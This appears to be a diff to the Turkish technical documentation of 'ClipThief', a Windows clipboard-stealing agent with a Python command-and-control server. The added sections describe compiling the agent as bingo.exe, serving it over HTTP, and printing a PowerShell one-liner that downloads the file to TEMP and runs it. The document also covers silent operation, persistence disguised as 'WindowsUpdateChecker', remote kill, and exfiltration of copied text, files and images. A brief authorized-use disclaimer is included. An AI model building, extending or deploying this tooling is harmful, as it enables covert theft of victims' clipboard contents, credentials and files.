@@ -35,10 +35,12 @@
    - 5.3 [REST API Endpoint'leri](#53-rest-api-endpointleri)
    - 5.4 [İn-Memory Durum Yönetimi](#54-i̇n-memory-durum-yönetimi)
    - 5.5 [Heartbeat Monitor — Agent Timeout](#55-heartbeat-monitor--agent-timeout)
-   - 5.6 [Rich UI — Bileşenler](#56-rich-ui--bileşenler)
-   - 5.7 [Terminal UI Ekranları](#57-terminal-ui-ekranları)
-   - 5.8 [Veritabanı Yönetim Ekranı](#58-veritabanı-yönetim-ekranı)
-   - 5.9 [Ana Döngü ve Otomatik Yönlendirme](#59-ana-döngü-ve-otomatik-yönlendirme)
+   - 5.6 [Agent Builder — Otomatik Derleme](#56-agent-builder--otomatik-derleme)
+   - 5.7 [Loglama Sistemi](#57-loglama-sistemi)
+   - 5.8 [Rich UI — Bileşenler](#58-rich-ui--bileşenler)
+   - 5.9 [Terminal UI Ekranları](#59-terminal-ui-ekranları)
+   - 5.10 [Veritabanı Yönetim Ekranı](#510-veritabanı-yönetim-ekranı)
+   - 5.11 [Başlatma Akışı ve Ana Döngü](#511-başlatma-akışı-ve-ana-döngü)
 6. [İletişim Protokolü](#6-i̇letişim-protokolü)
 7. [Veri Akışı Diyagramı](#7-veri-akışı-diyagramı)
 8. [Güvenlik Notları](#8-güvenlik-notları)
@@ -55,6 +57,8 @@ ClipThief iki bileşenden oluşur:
 | **C2 Sunucusu** | Python 3 + Flask + Rich | `C2/c2_server.py` |
 
 Agent, hedef Windows sistemde arka planda sessizce çalışır. Clipboard değişikliklerini (metin, resim, dosya) yakalar ve HTTP üzerinden C2'ye gönderir. C2 ise Rich kütüphanesiyle renklendirilmiş terminal arayüzü sunar; operatör her agent'ı izleyebilir, geçmişe bakabilir, komut gönderebilir ve veritabanını yönetebilir.
+
+C2 başlatıldığında kaynak kodu otomatik olarak hedef IP/port bilgisiyle derlenir, `agents/bingo.exe` olarak kaydedilir ve HTTP üzerinden servis edilir. Operatöre PowerShell one-liner payload gösterilir.
 
 ---
 
@@ -74,7 +78,11 @@ ClipThief/
 │   ├── requirements.txt                # Python bağımlılıkları (flask, rich)
 │   ├── setup_and_run.bat               # Windows başlatma scripti
 │   ├── c2_data.db                      # SQLite veritabanı (otomatik oluşur)
-│   └── downloads/                      # İndirilen clipboard dosyaları
+│   ├── agents/                         # Derlenmiş agent EXE'leri
+│   │   └── bingo.exe                   # C2 startup'ta otomatik derlenir
+│   ├── downloads/                      # İndirilen clipboard dosyaları
+│   └── logs/                           # Oturum log dosyaları
+│       └── YYYY-MM-DD_HH-MM-SS.log     # Her başlatmada yeni dosya
 │
 ├── PROJECT.md                          # Bu dosya (teknik dokümantasyon)
 └── README.md                           # Kurulum ve kullanım kılavuzu
@@ -85,23 +93,24 @@ ClipThief/
 ## 3. Sistem Mimarisi
 
 ```
-┌─────────────────────────────┐          HTTP/JSON          ┌──────────────────────────────┐
-│         AGENT (C++)         │ ──────────────────────────► │      C2 SERVER (Python)      │
-│                             │                             │                              │
-│  WinMain (Windows subsys.)  │  POST /api/agent/register   │  Flask REST API (daemon)     │
-│  ├─ LoadOrCreateAgentId()   │  POST /api/agent/<id>/clip  │  ├─ SQLite WAL (c2_data.db)  │
-│  ├─ RegisterAgent()         │  GET  /api/agent/<id>/cmd   │  ├─ In-memory agents{}       │
-│  ├─ AddClipboardListener()  │ ◄──────────────────────────  │  ├─ Heartbeat monitor        │
-│  ├─ WndProc (message loop)  │  {"command":"kill|persist"}  │  └─ Rich Terminal UI         │
-│  └─ CommandPollThread()     │                             │                              │
-│                             │                             │  Threads:                    │
-│  Clipboard Formats:         │                             │  ├─ flask (daemon)           │
-│  ├─ CF_UNICODETEXT (text)   │                             │  ├─ heartbeat (daemon)       │
-│  ├─ CF_HDROP (files)        │                             │  └─ main (UI loop)           │
-│  └─ CF_DIB (images→BMP)     │                             │                              │
-└─────────────────────────────┘                             └──────────────────────────────┘
+┌─────────────────────────────┐          HTTP/JSON          ┌──────────────────────────────────┐
+│         AGENT (C++)         │ ──────────────────────────► │       C2 SERVER (Python)         │
+│                             │                             │                                  │
+│  WinMain (Windows subsys.)  │  POST /api/agent/register   │  Flask REST API (daemon)         │
+│  ├─ LoadOrCreateAgentId()   │  POST /api/agent/<id>/clip  │  ├─ SQLite WAL (c2_data.db)      │
+│  ├─ RegisterAgent()         │  GET  /api/agent/<id>/cmd   │  ├─ In-memory agents{}           │
+│  ├─ AddClipboardListener()  │ ◄──────────────────────────  │  ├─ Heartbeat monitor (daemon)   │
+│  ├─ WndProc (message loop)  │  {"command":"kill|persist"}  │  ├─ Agent Builder (startup)      │
+│  └─ CommandPollThread()     │                             │  └─ Rich Terminal UI (main)      │
+│                             │  GET  /agent/bingo.exe      │                                  │
+│  Clipboard Formats:         │ ◄──────────────────────────  │  Threads:                        │
+│  ├─ CF_UNICODETEXT (text)   │  [EXE binary download]      │  ├─ flask (daemon)               │
+│  ├─ CF_HDROP (files)        │                             │  ├─ heartbeat (daemon)           │
+│  └─ CF_DIB (images→BMP)     │                             │  └─ main (UI loop)               │
+└─────────────────────────────┘                             └──────────────────────────────────┘
          │ Registry                                                    │ c2_data.db
          │ HKCU\...\ClipAgent → AgentID = <UUID>                      │ agents + clipboard_entries
+                                                                       │ logs/YYYY-MM-DD_HH-MM-SS.log
 ```
 
 ---
@@ -119,6 +128,8 @@ ClipThief/
 | Entry point | `WinMain` |
 
 Subsystem `Windows` olduğu için EXE çalıştırıldığında hiçbir terminal penceresi açılmaz. Process Task Manager'da görünür ama kullanıcıya herhangi bir UI sunmaz.
+
+> **C2 otomatik derleme:** Kaynak kodu C2'nin `build_agent()` fonksiyonu tarafından derlenir. Operatör Visual Studio'da manuel derleme yapmak zorunda değildir — `bingo.exe` her C2 başlatılmasında `--agent-ip` ve `--port` değerleriyle otomatik üretilir.
 
 ### 4.2 Bağımlılıklar ve Kütüphaneler
 
@@ -141,8 +152,8 @@ Subsystem `Windows` olduğu için EXE çalıştırıldığında hiçbir terminal
 ### 4.3 Sabitler ve Global Değişkenler
 
 ```cpp
-static const char* C2_HOST   = "127.0.0.1";    // C2 sunucu adresi — deploy öncesi güncelle
-static const int   C2_PORT   = 5000;            // C2 sunucu portu
+static const char* C2_HOST   = "127.0.0.1";    // C2 sunucu adresi — build_agent() tarafından yazılır
+static const int   C2_PORT   = 5000;            // C2 sunucu portu  — build_agent() tarafından yazılır
 static const int   POLL_MS   = 3000;            // Komut polling aralığı (ms)
 static const char* REG_PATH  = "Software\\Microsoft\\Windows\\CurrentVersion\\ClipAgent";
 static const char* TASK_NAME = "WindowsUpdateChecker"; // Scheduled task adı
@@ -152,6 +163,8 @@ static std::string   g_agentId;        // Kalıcı unique ID (registry'den yükl
 static HWND          g_hwnd = NULL;    // Message-only pencere handle'ı
 static volatile bool g_running = true; // Thread sonlandırma bayrağı
 ```
+
+`C2_HOST` ve `C2_PORT` değerleri `build_agent()` tarafından regex ile kaynak dosyasının geçici kopyasına yazılır; orijinal kaynak değişmez.
 
 ### 4.4 UUID Üretimi
 
@@ -206,8 +219,6 @@ static std::string JsonGetString(const std::string& json, const std::string& key
 
 ### 4.8 HTTP İletişimi (WinINet)
 
-Orijinal kodda `URLOpenBlockingStreamA` (deprecated, resource leak) yerine WinINet API'si kullanılır.
-
 ```
 InternetOpenA()           → HINTERNET oturumu aç
   └─ InternetConnectA()   → Host:Port bağlantısı
@@ -261,9 +272,6 @@ WM_CLIPBOARDUPDATE
 
 **CF_UNICODETEXT neden CF_TEXT yerine?**  
 `CF_TEXT` ANSI'dir; Türkçe/Arapça/Çince karakterleri bozar. `CF_UNICODETEXT` UTF-16 içerir; `WideCharToMultiByte(CP_UTF8)` ile kayıpsız UTF-8'e çevrilir.
-
-**Düzeltilen kaynak sızıntıları:**  
-Orijinal kodda `GlobalUnlock` eksikti. Her `GlobalLock` çağrısı artık karşılık gelen `GlobalUnlock` ile tamamlanır.
 
 ### 4.12 DIB → BMP Dönüşümü
 
@@ -332,7 +340,7 @@ static DWORD WINAPI CommandPollThread(LPVOID)
 }
 ```
 
-Komut C2'de `pending_cmds` map'ine konulur; bir sonraki polling'de teslim edilir ve map'ten silinir (tek seferlik teslimat).
+Komut C2'de `pending_cmds` map'ine konulur; bir sonraki polling'de teslim edilir ve map'ten silinir (tek seferlik teslimat). Her polling aynı zamanda `last_seen` güncellediğinden ayrı bir heartbeat endpoint'i gerekmez.
 
 ### 4.16 Mesaj Penceresi ve WndProc
 
@@ -394,6 +402,8 @@ rich>=13.0.0    # Renkli terminal UI (tablo, panel, syntax highlight, prompt)
 sqlite3         # Python standart kütüphanesi — kurulum gerektirmez
 ```
 
+`build_agent()` için ek gereksinim: Visual Studio 2022 (C++ Desktop workload) — `MSBuild.exe` ve Windows SDK'sı kurulu olmalıdır.
+
 ### 5.2 SQLite Veritabanı
 
 **Dosya:** `C2/c2_data.db`  
@@ -454,8 +464,8 @@ CREATE TABLE clipboard_entries (
 ```
 
 **Davranış:**
-- **Yeni agent:** `agents{}` + DB'ye ekle → `new_agent_queue.put()` → Rich Panel bildirimi
-- **Reconnect:** `last_seen` + `status="active"` güncelle → renkli bildirim
+- **Yeni agent:** `agents{}` + DB'ye ekle → `new_agent_queue.put()` → Rich Panel bildirimi → log INFO
+- **Reconnect:** `last_seen` + `status="active"` güncelle → renkli bildirim → log INFO
 
 #### `POST /api/agent/<id>/clipboard`
 
@@ -465,14 +475,18 @@ CREATE TABLE clipboard_entries (
 ```
 
 `type`: `"text"` | `"image"` | `"file"`  
-Her çağrıda `db_next_seq` ile sıra numarası alınır, DB'ye yazılır.
+Her çağrıda `db_next_seq` ile sıra numarası alınır, DB'ye yazılır, log INFO.
 
 #### `GET /api/agent/<id>/command`
 
 **Response:** `{"command": "none" | "kill" | "persist"}`
 
 `pending_cmds.pop(agent_id, "none")` — komut bir kez teslim edilir, map'ten silinir.  
-Aynı zamanda `last_seen` güncellenir (polling = heartbeat).
+Aynı zamanda `last_seen` güncellenir (polling = heartbeat). Komut `none` değilse log INFO.
+
+#### `GET /agent/bingo.exe`
+
+Derlenmiş agent EXE'sini binary olarak serve eder. `agents/bingo.exe` dosyası startup'ta `build_agent()` tarafından üretilir. İndirme log INFO, dosya yoksa log WARNING.
 
 ### 5.4 İn-Memory Durum Yönetimi
 
@@ -481,7 +495,7 @@ agents: dict       = {}              # DB'nin hızlı erişim kopyası
 pending_cmds: dict = {}              # agent_id → "kill" | "persist"
 db_lock            = threading.Lock()  # agents + pending_cmds thread safety
 new_agent_queue    = queue.Queue()   # Flask thread → UI thread haberleşmesi
-AGENT_TIMEOUT_SEC  = 10             # Heartbeat timeout eşiği
+AGENT_TIMEOUT_SEC  = 10             # Heartbeat timeout eşiği (saniye)
 ```
 
 `_ui_lock` ayrı bir kilit — terminal yazma/okuma operasyonlarını serialize eder.  
@@ -503,6 +517,7 @@ def _heartbeat_monitor():
                 if elapsed > AGENT_TIMEOUT_SEC:   # > 10s polling yok
                     a["status"] = "dead"
                     db_upsert_agent(a)
+                    log.warning(f"AGENT DEAD  id={agent_id}  elapsed={int(elapsed)}s")
                     _notify("dead", f"AGENT DEAD  {a['user']}@{a['hostname']}  ...")
 ```
 
@@ -510,19 +525,115 @@ def _heartbeat_monitor():
 
 | t | Olay |
 |---|------|
-| 0s | Kill komutu kuyruğa alındı |
-| ~3s | Son polling — agent komutu alır, kapanır |
+| 0s | Kill komutu kuyruğa alındı — log INFO |
+| ~3s | Son polling — agent komutu alır, kapanır — log INFO |
 | ~13s | Heartbeat monitor timeout'u algılar |
-| ~15s | `[!] AGENT DEAD` bildirimi terminale düşer |
+| ~15s | `[!] AGENT DEAD` bildirimi + log WARNING |
 
-Agent yeniden başlarsa `api_register` status'u `"active"` yapar ve reconnect bildirimi verilir.
+Agent yeniden başlarsa `api_register` status'u `"active"` yapar ve reconnect bildirimi + log INFO verilir.
 
-### 5.6 Rich UI — Bileşenler
+### 5.6 Agent Builder — Otomatik Derleme
+
+C2 başlatıldığında `build_agent(c2_ip, c2_port)` çalışır:
+
+```
+1. CPP_SRC ve VCXPROJ_SRC varlığını doğrula
+2. _find_msbuild() — MSBuild.exe'yi bul:
+       a. vswhere.exe (C:\Program Files (x86)\Microsoft Visual Studio\Installer\)
+       b. Fallback: VS2022/2019 × Community/Professional/Enterprise/BuildTools
+3. tempfile.TemporaryDirectory() oluştur
+4. ClipboardDump.cpp kaynak metnini oku
+5. regex ile C2_HOST ve C2_PORT değerlerini yaz:
+       static const char* C2_HOST = "<c2_ip>"
+       static const int   C2_PORT = <c2_port>
+6. Geçici dizine modifiye CPP + orijinal vcxproj kopyala
+7. MSBuild çalıştır:
+       msbuild ClipboardDump.vcxproj
+           /p:Configuration=Release /p:Platform=x64
+           /p:OutDir=<tmp>/out/ /nologo /verbosity:quiet
+8. Çıktı EXE'yi agents/bingo.exe olarak kopyala
+9. /agent/bingo.exe endpoint'i üzerinden serve et
+```
+
+**Argüman çözümleme (`--agent-ip`):**
+
+```python
+if args.agent_ip:           agent_ip = args.agent_ip     # Açıkça verildi
+elif args.host != "0.0.0.0": agent_ip = args.host        # Spesifik listen adresi
+else:                         agent_ip = _get_local_ip()  # Otomatik tespit
+```
+
+`_get_local_ip()`: `socket.connect("8.8.8.8:80")` + `getsockname()` — en kısa yoldan primary NIC IP'si.
+
+**Payload gösterimi (startup'ta):**
+
+```
+╭──  PowerShell One-Liner  ─────────────────────────────────────────────────────╮
+│  $p="$env:TEMP\bingo.exe";(New-Object Net.WebClient).DownloadFile(           │
+│  'http://192.168.1.100:5000/agent/bingo.exe',$p);Start-Process $p            │
+╰───────────────────────────────────────────────────────────────────────────────╯
+```
+
+### 5.7 Loglama Sistemi
+
+**Dosya:** `C2/logs/<YYYY-MM-DD_HH-MM-SS>.log`  
+Her C2 başlatmasında yeni bir log dosyası açılır. Eski oturumların logları korunur.
+
+**Kurulum:**
+
+```python
+def _setup_logger() -> logging.Logger:
+    LOGS_DIR.mkdir(parents=True, exist_ok=True)
+    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    fh = logging.FileHandler(LOGS_DIR / f"{ts}.log", encoding="utf-8")
+    fh.setFormatter(logging.Formatter(
+        "%(asctime)s  %(levelname)-8s  %(message)s",
+        datefmt="%Y-%m-%d %H:%M:%S",
+    ))
+    ...
+```
+
+**Log seviyeleri ve olayları:**
+
+| Seviye | Olay |
+|--------|------|
+| INFO | `SERVER START` — başlatma parametreleri |
+| INFO | `BUILD START` — derleme başladı |
+| INFO | `BUILD OK` — bingo.exe boyutu |
+| ERROR | `BUILD FAILED` — MSBuild hatası, kaynak bulunamadı |
+| INFO | `AGENT NEW` — id, user, hostname, ip, os |
+| INFO | `AGENT RECONNECT` — id, user, hostname, ip |
+| INFO | `CLIPBOARD` — id, type, seq, preview (80 karakter) |
+| INFO | `COMMAND QUEUED` — operatör kill/persist kuyrukladı |
+| INFO | `COMMAND SENT` — agent komutu polling ile aldı |
+| INFO | `AGENT DOWNLOAD` — bingo.exe başarıyla indirildi |
+| WARNING | `AGENT DOWNLOAD FAILED` — bingo.exe bulunamadı |
+| WARNING | `AGENT DEAD` — timeout, elapsed saniye |
+| WARNING | `DB CLEARED` — tüm veriler silindi |
+| INFO | `AGENT DELETED` — tek agent silindi |
+| INFO | `SERVER STOP` — operatör çıkış yaptı |
+
+**Örnek log çıktısı:**
+```
+2026-04-22 14:30:00  INFO      SERVER START    listen=0.0.0.0:5000  agent_ip=192.168.1.100
+2026-04-22 14:30:01  INFO      BUILD START     c2_ip=192.168.1.100  c2_port=5000
+2026-04-22 14:30:08  INFO      BUILD OK        output=agents\bingo.exe  size=98,304 bytes
+2026-04-22 14:32:11  INFO      AGENT NEW       id=a1b2c3...  user=john  hostname=PC-01
+2026-04-22 14:32:15  INFO      CLIPBOARD       id=a1b2c3...  type=text  seq=1  preview='SELECT * FROM users'
+2026-04-22 14:35:00  INFO      AGENT DOWNLOAD  bingo.exe served  src=10.0.0.10
+2026-04-22 14:40:00  INFO      COMMAND QUEUED  id=a1b2c3...  command=kill  by=operator
+2026-04-22 14:40:03  INFO      COMMAND SENT    id=a1b2c3...  command=kill
+2026-04-22 14:40:15  WARNING   AGENT DEAD      id=a1b2c3...  elapsed=12s
+2026-04-22 15:00:00  WARNING   DB CLEARED      all agents and clipboard entries wiped  by=operator
+2026-04-22 16:00:00  INFO      SERVER STOP     operator quit
+```
+
+### 5.8 Rich UI — Bileşenler
 
 | Rich Bileşeni | Kullanım Yeri |
 |---------------|--------------|
 | `rich.table.Table` | Agent listesi, clipboard geçmişi |
-| `rich.panel.Panel` | Yeni agent bildirimi, agent detayları, DB stats |
+| `rich.panel.Panel` | Yeni agent bildirimi, agent detayları, DB stats, PowerShell payload |
 | `rich.text.Text` | Renkli etiketli içerik bloğu |
 | `rich.syntax.Syntax` | Clipboard metin — syntax highlighting |
 | `rich.prompt.Confirm` | KILL / Wipe onayı |
@@ -539,6 +650,8 @@ Agent yeniden başlarsa `api_register` status'u `"active"` yapar ve reconnect bi
 | `[FILE]` | Yeşil |
 | DEAD bildirimi | Kırmızı bold |
 | RECONNECT bildirimi | Sarı bold |
+| PowerShell payload | Sarı bold |
+| Payload panel border | Yeşil |
 
 **Syntax dil tespiti (`_detect_lang`):**
 
@@ -550,7 +663,7 @@ if text.startswith("<"):             → "xml"
 else:                                → "text"  (plain panel)
 ```
 
-### 5.7 Terminal UI Ekranları
+### 5.9 Terminal UI Ekranları
 
 **Ana ekran — `screen_agent_list()`**
 ```
@@ -564,7 +677,6 @@ else:                                → "text"  (plain panel)
 
 **Agent menüsü — `screen_agent_menu()`**
 
-Agent bilgileri Rich Panel içinde renk kodlu gösterilir.
 ```
 ╭─ Agent Details ──────────────────────────────╮
 │ Agent ID:   a1b2c3d4-e5f6-...               │
@@ -598,21 +710,14 @@ Agent bilgileri Rich Panel içinde renk kodlu gösterilir.
 
 **Metin görüntüleme — `screen_view_entry()` (text)**
 
-Dil tespit edilirse `rich.syntax.Syntax` ile Monokai temalı, satır numaralı gösterim:
-
-```python
- 1  SELECT *
- 2  FROM users
- 3  WHERE active = 1
-```
-
+Dil tespit edilirse `rich.syntax.Syntax` ile Monokai temalı, satır numaralı gösterim.  
 Dil tespit edilemezse plain text Panel içinde gösterilir.
 
 **İkili dosya / resim görüntüleme:**
 
 `downloads/` klasörüne kaydedilir, OS varsayılan uygulamasıyla otomatik açılır.
 
-### 5.8 Veritabanı Yönetim Ekranı
+### 5.10 Veritabanı Yönetim Ekranı
 
 ```
 ╭─ Database ───────────────────────────╮
@@ -626,10 +731,31 @@ Dil tespit edilemezse plain text Panel içinde gösterilir.
   [0] Back
 ```
 
-Temizlik için `Confirm.ask` — `[y/n]` prompt, hatalı girişte tekrar sorar.  
-Agent menüsünden `[4]` ile tek agent silinebilir.
+Temizlik için `Confirm.ask` — `[y/n]` prompt, hatalı girişte tekrar sorar. Silme işlemi log WARNING.  
+Agent menüsünden `[4]` ile tek agent silinebilir. Silme işlemi log INFO.
 
-### 5.9 Ana Döngü ve Otomatik Yönlendirme
+### 5.11 Başlatma Akışı ve Ana Döngü
+
+**Startup sırası:**
+
+```
+main()
+  │
+  ├─ argparse → --host, --port, --agent-ip çözümlenir
+  ├─ DOWNLOADS_DIR, AGENTS_DIR, LOGS_DIR oluşturulur
+  ├─ _setup_logger() → logs/<ts>.log açılır
+  ├─ db_init() → c2_data.db hazırlanır, agents{} belleğe yüklenir
+  ├─ log SERVER START
+  ├─ build_agent(agent_ip, port):
+  │       └─ MSBuild ile bingo.exe derlenir → agents/bingo.exe
+  ├─ PowerShell one-liner konsola yazdırılır
+  ├─ "Press Enter to start C2..." — operatör beklenir
+  ├─ Flask thread (daemon) başlatılır
+  ├─ Heartbeat monitor thread (daemon) başlatılır
+  └─ run_terminal_ui() → ana UI döngüsü
+```
+
+**Ana UI döngüsü:**
 
 ```python
 def run_terminal_ui():
@@ -656,7 +782,8 @@ Flask thread → `new_agent_queue.put(agent_id)` → UI thread `input()` döner 
 |----------|-----|--------|--------|
 | `POST /api/agent/register` | Agent → C2 | Başlangıçta bir kez | Sistem bilgisi JSON |
 | `POST /api/agent/<id>/clipboard` | Agent → C2 | Her clipboard değişiminde | Base64 + tip + dosya adı |
-| `GET /api/agent/<id>/command` | Agent → C2 | Her 3 saniyede (polling) | Komut sorgusu + heartbeat |
+| `GET /api/agent/<id>/command` | Agent → C2 | Her 3 saniyede (polling + heartbeat) | Komut sorgusu |
+| `GET /agent/bingo.exe` | Hedef → C2 | Deployment sırasında bir kez | EXE binary (HTTP indir) |
 
 Tüm iletişim düz HTTP/JSON. Veri Base64 ile kodlanır. Max body: 200MB (Flask config).
 
@@ -665,31 +792,49 @@ Tüm iletişim düz HTTP/JSON. Veri Base64 ile kodlanır. Max body: 200MB (Flask
 ## 7. Veri Akışı Diyagramı
 
 ```
-Agent Başlar
+C2 Başlar
+    │
+    ├─► _setup_logger() → logs/<ts>.log
+    ├─► db_init() → c2_data.db yükle
+    ├─► build_agent(ip, port) → bingo.exe derle
+    ├─► PowerShell payload göster
+    ├─► "Press Enter to start C2..." bekle
+    └─► Flask + Heartbeat thread başlat
+
+Agent Deploy (hedef sistemde)
+    │
+    ├─► PowerShell one-liner çalıştırılır
+    │       └─ GET /agent/bingo.exe → bingo.exe indirilir
+    │               └─ C2: log AGENT DOWNLOAD
+    │
+    └─► bingo.exe çalıştırılır
+
+Agent Çalışır
     │
     ├─► LoadOrCreateAgentId()
     │       └─ Registry'den UUID oku / yoksa üret ve yaz
     │
     ├─► RegisterAgent()
     │       └─ POST /api/agent/register
-    │               └─ C2: agents{} + DB ← new_agent_queue ← Rich Panel bildirimi
+    │               └─ C2: agents{} + DB ← new_agent_queue ← Rich Panel ← log NEW
     │
     ├─► AddClipboardFormatListener(HWND_MESSAGE)
     │
     ├─► CommandPollThread [arka plan, her 3s]
     │       └─ GET /api/agent/<id>/command
-    │               ├─ "kill"    → SelfDestruct() [geri dönmez]
-    │               ├─ "persist" → AddPersistence()
+    │               └─ C2: last_seen güncelle
+    │               ├─ "kill"    → SelfDestruct() ← log COMMAND SENT [geri dönmez]
+    │               ├─ "persist" → AddPersistence() ← log COMMAND SENT
     │               └─ "none"   → devam
     │
     └─► Mesaj Döngüsü
             └─ WM_CLIPBOARDUPDATE
-                    ├─ CF_UNICODETEXT → UTF-8 → Base64 → POST (text)
-                    ├─ CF_HDROP       → Dosya oku → Base64 → POST (file)
-                    └─ CF_DIB         → DibToBmp → Base64 → POST (image)
+                    ├─ CF_UNICODETEXT → UTF-8 → Base64 → POST (text) ← log CLIPBOARD
+                    ├─ CF_HDROP       → Dosya oku → Base64 → POST (file) ← log CLIPBOARD
+                    └─ CF_DIB         → DibToBmp → Base64 → POST (image) ← log CLIPBOARD
 
 C2 Heartbeat Monitor [arka plan, her 5s]
-    └─ last_seen > 10s → status="dead" → DB güncelle → Kırmızı bildirim
+    └─ last_seen > 10s → status="dead" → DB güncelle → log DEAD → Kırmızı bildirim
 ```
 
 ---
@@ -707,6 +852,7 @@ Bu araç yalnızca **yetkilendirilmiş** ortamlarda (penetration testing, red te
 | Polling gecikmesi | Komut teslimi max 3s gecikmeli |
 | Dosya limiti | 50MB üzeri kırpılır |
 | Tek yönlü komut | Sadece kill / persist — tasarım gereği |
+| Log dosyaları | `logs/` dizini operasyon sonunda manuel temizlenmeli |
 
 **Temizlik:**
 
@@ -718,4 +864,6 @@ Agent tarafı:
 C2 tarafı:
   Tek agent sil   → Agent Menüsü → [4]
   Tam temizlik    → Ana Menü → [D] → [1] → Confirm
+  Log dosyaları   → C2/logs/ dizini manuel silinmeli
+  Agent EXE       → C2/agents/bingo.exe manuel silinmeli
 ```
